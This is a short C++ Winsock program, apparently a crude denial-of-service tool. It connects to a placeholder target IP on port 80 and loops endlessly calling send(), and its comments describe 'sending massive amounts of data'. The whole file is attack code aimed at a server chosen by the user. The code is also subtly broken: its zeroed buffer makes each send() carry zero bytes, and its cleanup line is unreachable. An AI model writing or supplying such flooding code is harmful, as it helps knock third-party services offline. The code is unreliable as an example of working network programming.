#include <iostream>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return -1;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cout << "Error creating socket" << std::endl;
        return -1;
    }

    struct sockaddr_in serverInfo;
    serverInfo.sin_family = AF_INET;
    serverInfo.sin_addr.s_addr = inet_addr("YOUR_TARGET_IP_ADDRESS");
    serverInfo.sin_port = htons(80);

    if (connect(sock, (struct sockaddr*)&serverInfo, sizeof(serverInfo)) < 0) {
        std::cout << "Error connecting to target" << std::endl;
        return -1;
    }

    char buffer[1024];
    while (true) {
        memset(buffer, 0x00, sizeof(buffer));
        send(sock, buffer, strlen(buffer), 0);
        // Simulate sending massive amounts of data
        // This can be done in a loop by sending packets with small delays
    }

    closesocket(sock);

    return 0;
}
